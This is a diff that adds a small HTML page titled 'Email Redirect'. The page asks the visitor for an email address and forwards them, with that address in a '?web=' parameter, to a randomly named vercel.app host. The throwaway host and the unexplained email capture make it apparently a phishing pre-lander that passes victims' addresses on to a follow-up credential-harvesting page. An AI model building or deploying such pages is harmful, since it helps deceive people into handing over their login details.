@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Email Redirect</title>
+  <script>
+    function redirectWithEmail(event) {
+      event.preventDefault(); // stop form from submitting normally
+      const email = document.getElementById("email").value.trim();
+      if (email) {
+        const targetUrl = "https://b5af32c6a58a056585e52624a.vercel.app/?web=" + encodeURIComponent(email);
+        window.location.href = targetUrl;
+      } else {
+        alert("Please enter your email.");
+      }
+    }
+  </script>
+</head>
+<body>
+  <h2>Enter your email to continue</h2>
+  <form onsubmit="redirectWithEmail(event)">
+    <input type="email" id="email" name="email" placeholder="Enter your email" required>
+    <button type="submit">Go</button>
+  </form>
+</body>
+</html>
